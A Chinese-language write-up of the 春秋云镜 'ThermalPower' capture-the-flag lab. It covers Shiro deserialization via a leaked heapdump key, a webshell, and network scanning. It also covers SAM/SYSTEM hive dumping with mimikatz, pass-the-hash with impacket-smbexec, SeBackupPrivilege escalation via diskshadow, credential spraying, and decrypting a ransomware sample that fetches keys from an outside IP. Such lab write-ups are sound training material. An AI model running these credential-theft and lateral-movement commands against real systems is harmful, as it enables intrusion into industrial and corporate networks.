---
title: "春秋云镜-ThermalPower"
date: 2026-07-08 00:00:00 +0800
categories: [渗透]
tags: [春秋云镜]
---

## flag1

8080 端口存在 shiro 特征：

![1783449777597](/assets/ThermalPower/1783449777597.png)

典中典春秋云镜的`heapdump`泄露

`/actuator/heapdump`下载下来，用[JDumpSpider](https://github.com/whwlsfb/JDumpSpider) 分析找到`shirokey`

![1783449871300](/assets/ThermalPower/1783449871300.png)

直接用工具Shiro 反序列化下马子

![1783446070891](/assets/ThermalPower/1783446070891.png)

连接冰蝎

![1783446088430](/assets/ThermalPower/1783446088430.png)



## flag2(window特权利用)

扫描加搭代理

```
root@security:/# ./fscan -h 172.22.17.213/16 -hn 172.22.17.213

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.3
start infoscan
(icmp) Target 172.22.17.6     is alive
(icmp) Target 172.22.255.253  is alive
(icmp) Target 172.22.26.11    is alive
[*] LiveTop 172.22.0.0/16    段存活数量为: 3
[*] LiveTop 172.22.17.0/24   段存活数量为: 1
[*] LiveTop 172.22.255.0/24  段存活数量为: 1
[*] LiveTop 172.22.26.0/24   段存活数量为: 1
[*] Icmp alive hosts len is: 3
172.22.26.11:445 open
172.22.17.6:445 open
172.22.26.11:139 open
172.22.17.6:139 open
172.22.26.11:135 open
172.22.17.6:135 open
172.22.26.11:80 open
172.22.17.6:80 open
172.22.17.6:21 open
172.22.26.11:1433 open
[*] alive ports len is: 10
start vulscan
[*] NetInfo
[*]172.22.26.11
   [->]WIN-SCADA
   [->]172.22.26.11
[*] NetBios 172.22.26.11    WORKGROUP\WIN-SCADA
[*] NetBios 172.22.17.6     WORKGROUP\WIN-ENGINEER
[*] NetInfo
[*]172.22.17.6
   [->]WIN-ENGINEER
   [->]172.22.17.6
[*] WebTitle http://172.22.26.11       code:200 len:703    title:IIS Windows Server
[+] mssql 172.22.26.11:1433:sa 123456
[*] WebTitle http://172.22.17.6        code:200 len:661    title:172.22.17.6 - /
[+] ftp 172.22.17.6:21:anonymous
   [->]Modbus
   [->]PLC
   [->]web.config
   [->]WinCC
   [->]内部软件
   [->]火创能源内部资料
已完成 10/10
[*] 扫描结束,耗时: 10.495400741s
```

存在 ftp 匿名访问，直接访问主机 80 端口也可以访问到这些敏感资源

从“内部员工通讯录.xlsx”中获取到员工信息：

![1783447646300](/assets/ThermalPower/1783447646300.png)

从“火创能源内部通知.docx”中获取到默认密码规则：

![1783447658084](/assets/ThermalPower/1783447658084.png)

职位为“SCADA 工程师”的人员账号密码都能 RDP 登录

并且都属于 Backup Operators 组成员：**(备份操作员）** 

![1783448023260](/assets/ThermalPower/1783448023260.png)

正常情况下Backup Operator有SeBackupPrivilege和SeRestorePrivilege特权,这里却没有



试试转储 sam&system 注册表,发现不需要特权即可以成功导出：

```
PS C:\Users\chenhua\Desktop> cd C:\
PS C:\Users\chenhua\Desktop> mkdir Temp
PS C:\Users\chenhua\Desktop> cd C:\Temp
PS C:\Temp> reg save hklm\sam c:\Temp\sam
PS C:\Temp> reg save hklm\system c:\Temp\system
```

注意这里必须命名为 `C:\Temp`，因为`Temp`才是临时文件夹

直接用`mimikatz`解密Hash

```
lsadump::sam /sam:sam /system:system
```

![1783450854378](/assets/ThermalPower/1783450854378.png)

然后直接 PTH

```
proxychains4 impacket-smbexec -hashes :f82292b7ac79b05d5b0e3d302bd0d279 xiaorang.lab/administrator@172.22.17.6 -codec gbk
```

得到flag



方法二:

 SeBackupPrivilege 提权

> 使用 SeBackupPrivilege 权限实现权限提升
>
> - SeBackupPrivilege 权限用来实现备份操作，允许文件内容检索，即使文件上的安全描述符可能未授予此类访问权限。diskshadow 是 Windows 的内置功能，可以帮助创建备份。参考
>
>    
>
>   hackingarticles
>
>   ，可以在本地或 DC 进行权限提升。
>
>   - Privilege 靶场中也使用该方式实现权限提升。ThermalPower 只涉及本地权限提升，不涉及 DC。

使用 [EnableSeBackupPrivilege.ps1](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1)启用 SeBackupPrivilege：

```
Import-Module .\EnableSeBackupPrivilege.ps1
```

用记事本新建 s.dsh 文件，创建目标系统上 C 盘的备份：

```
set context persistent nowriters
add volume c: alias mydrive
create
expose %mydrive% z:
```

将 s.dsh 文件编码和间距转换为与 Windows 机器兼容形式（在 Windows 上新建 s.dsh 可忽略此步）：

```
unix2dos s.dsh
```

以管理员权限在 PowerShell 中执行命令。当前用户路径权限不够，需要在 C 盘新建目录 Temp，执行 diskshadow 并拷贝 flag02 ：

```
PS C:\Users\chenhua\Desktop> cd C:\
PS C:\Users\chenhua\Desktop> mkdir Temp
PS C:\Temp> diskshadow /s s.dsh
PS C:\Temp> dir z:\Users\Administrator\flag\
PS C:\Temp> robocopy /b z:\Users\Administrator\flag\ . flag02.txt
```

得到 flag02







## flag3

从“SCADA.txt”中获取到管理员凭据：

![1783451437922](/assets/ThermalPower/1783451437922.png)

爆破一下

```
proxychains4 -q crackmapexec smb 172.22.26.0/24 -u Administrator -p IYnT3GyCiy3
```

![1783448879847](/assets/ThermalPower/1783448879847.png)

直接远程连接172.22.26.11

登录 SCADA 工程师站，并启动锅炉，获取到 flag：

![1783449228989](/assets/ThermalPower/1783449228989.png)





## flag4

本人不会密码,完全参考iker师傅的WP:

最近使用的文件中发现 `ScadaDB.sql`，但是为 0 字节：

因为该文件已经被加密为 `ScadaDB.sql.locky`：

![1783451841515](/assets/ThermalPower/1783451841515.png)

在 C 盘下找到勒索程序 `Lockyou.exe` ：

![1783451853123](/assets/ThermalPower/1783451853123.png)

勒索程序逆向:

将加密的文件 `ScadaDB.sql.locky` 和勒索程序 `Lockyou.exe` 下载到本地进行分析。`Lockyou.exe` 为 .NET 编译，需要使用[ dnSpy](https://github.com/dnSpy/dnSpy) 或者 [dotPeek](https://www.jetbrains.com/zh-cn/decompiler/) 进行反编译：

通过 dotPeek 反编译 `Lockyou.exe`。在源代码中可以看到，RSA 解密得到 `AES_KEY`。

```
public AESCrypto()
{
  this.BACKEND_URL = "http://39.101.170.47/";
  this.PRIVATE_KEY = this.GetHttpContent(this.BACKEND_URL + "privateKey");
  this.AES_KEY_ENC = this.GetHttpContent(this.BACKEND_URL + "encryptedAesKey");
  this.AES_KEY = this.DecryptRSA(this.AES_KEY_ENC, this.PRIVATE_KEY);
}
```

提示中给了两个附件，分别看一下内容：

```
encryptedAesKey # AES_KEY_ENC
privateKey  # PRIVATE_KEY
```

`encryptedAesKey` 即为 `AES_KEY_ENC`，是 Base64 字符串：

```
lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=
```

`privateKey` 即为 `PRIVATE_KEY`，是 XML 格式文件：

```
<RSAKeyValue><Modulus>uoL2CAaVtMVp7b4/Ifcex2Artuu2tvtBO25JdMwAneu6gEPCrQvDyswebchA1LnV3e+OJV5kHxFTp/diIzSnmnhUmfZjYrshZSLGm1fTwcRrL6YYVsfVZG/4ULSDURfAihyN1HILP/WqCquu1oWo0CdxowMsZpMDPodqzHcFCxE=</Modulus><Exponent>AQAB</Exponent><P>2RPqaofcJ/phIp3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+fqwWfUEmFw==</P><Q>2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5Fw==</Q><DP>ulK51o6ejUH/tfK281A7TgqNTvmH7fUra0dFR+KHCZFmav9e/na0Q//FivTeC6IAtN5eLMkKwDSR1rBm7UPKKQ==</DP><DQ>PO2J541wIbvsCMmyfR3KtQbAmVKmPHRUkG2VRXLBV0zMwke8hCAE5dQkcct3GW8jDsJGS4r0JsOvIRq5gYAyHQ==</DQ><InverseQ>JS2ttB0WJm223plhJQrWqSvs9LdEeTd8cgNWoyTkMOkYIieRTRko/RuXufgxppl4bL9RRTI8e8tkHoPzNLK4bA==</InverseQ><D>tuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0=</D></RSAKeyValue>
```

根据 locky 勒索软件家族加解密逻辑和 .NET 逆向代码，解密思路如下：

- 首先用 `privateKey` 对加密的 `encryptedAesKey`进行 RSA 解密，得到 `AES_KEY`。
- 再用 `AES_KEY` 对加密的文件 `ScadaDB.sql.locky` 解密，得到 `ScadaDB.sql`。

勒索文件解密

RSA解密

通过[工具](https://www.ssleye.com/ssltool/pem_xml.html)，将 `privateKey` 从 XML 格式转换为 PEM 格式，得到 `PRIVATE_KEY`：

![1783451994202](/assets/ThermalPower/1783451994202.png)

```
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+
PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3
YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr
rtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17
8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox
RqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN
UM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz
J5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ
vjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk
Vfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/
xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0
VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd
FiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy
PHvLZB6D8zSyuGw=
-----END PRIVATE KEY-----
```

通过[工具](https://www.lddgo.net/en/encrypt/rsa)，对 `encryptedAesKey` 进行解密，得到 `AES_KEY`：

![1783452149212](/assets/ThermalPower/1783452149212.png)

```
[base64]  cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk=
[hex]  7258bd82a5e94eb9bb08f31c74ff534a6552cd756049bde3ad6f806a44bb6b39
```

这一步也可以编程实现，见下文。

AES解密

使用 `AES KEY` 对文件 `ScadaDB.sql.locky` 进行解密。RSA + AES 解密的完整脚本如下：

```
# -*- coding: utf-8 -*-
# @Author  : iker
# @Time    : 2024/03/04 16:10
# @Function: RSA Privatekey Decryption & AES CBC Decryption
import base64
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5


def rsa_decrypt(data):
    private_key = """-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+
PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3
YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr
rtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17
8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox
RqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN
UM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz
J5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ
vjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk
Vfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/
xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0
VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd
FiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy
PHvLZB6D8zSyuGw=
-----END PRIVATE KEY-----"""
    data = base64.b64decode(data)
    priobj = Cipher_pkcs1_v1_5.new(RSA.importKey(private_key))
    decrypted_data = priobj.decrypt(data,None)
    return decrypted_data


def padding(data):
    # style(string) – Padding algorithm.It can be ‘pkcs7’ (default), ‘iso7816’ or ‘x923’.
    if len(data) % AES.block_size != 0:
        return pad(data, AES.block_size, 'pkcs7')
    else:
        return data

def aes_cbc_encrypt(iv, key, data):
    key = padding(key)
    data = padding(data)
    iv = padding(iv)

    aes = AES.new(key, AES.MODE_CBC, iv)
    cipher_data = aes.encrypt(data)
    return cipher_data

def aes_cbc_decrypt(iv, key, data):
    iv = padding(iv)
    key = padding(key)
    data = padding(data)

    aes = AES.new(key, AES.MODE_CBC, iv)
    data = aes.decrypt(data)
    return data

def decrypt_file(encrypted_filepath,output_filepath,key):
    with open(encrypted_filepath, 'rb') as f:
        data = f.read()

    iv = b'\x00' * 16
    decryption_result = aes_cbc_decrypt(iv, key, data)

    with open(output_filepath, 'wb') as f:
        f.write(decryption_result)

if __name__ == "__main__":
    encryptedAesKey = "lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g="
    key = rsa_decrypt(encryptedAesKey)
    encrypted_filepath = "ScadaDB.sql.locky"
    output_filepath = "ScadaDB.sql"
    decrypt_file(encrypted_filepath,output_filepath,key)
```

解密后得到 `ScadaDB.sql`。打开数据库文件，得到 flag04：

```
flag{63cd8cd5-151f-4f29-bdc7-f80312888158}
```



参考文章:

[春秋云境-ThermalPower-先知社区](https://xz.aliyun.com/news/13525)

[春秋云境-ThermalPower](https://nekosec.github.io/2025/02/15/春秋云境-ThermalPower/)

[ThermalPower - 春秋云境 | h0ny's blog](https://h0ny.github.io/posts/ThermalPower-春秋云境/)

